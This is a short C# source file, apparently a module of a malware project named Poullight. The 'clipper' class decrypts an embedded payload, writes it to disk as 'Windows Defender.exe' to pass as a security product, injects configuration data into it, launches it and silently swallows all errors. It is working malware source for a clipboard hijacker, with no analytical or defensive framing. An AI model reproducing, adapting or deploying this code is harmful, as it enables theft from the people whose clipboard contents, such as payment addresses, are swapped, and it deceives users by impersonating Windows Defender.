using Poullight.Properties;
using System.Diagnostics;
using System.IO;
using System.Text;

internal class clipper
{
	public static void Start()
	{
		try
		{
			string text = Exporter.Export("<cpdata>", "</cpdata>", Starter.FileData);
			if (!string.IsNullOrEmpty(text.Trim()) && text != "null")
			{
				string text2 = $"{Buffer.path_t}Windows Defender.exe";
				try
				{
					if (File.Exists(text2))
					{
						File.Delete(text2);
					}
				}
				catch
				{
				}
				File.WriteAllText(text2, $"{Encoding.GetEncoding(1251).GetString(Encrypter.AES_Decryptor(Resources.cpp))}<clbase>{text}</clbase>", Encoding.GetEncoding(1251));
				Process.Start(text2);
			}
		}
		catch
		{
		}
	}
}
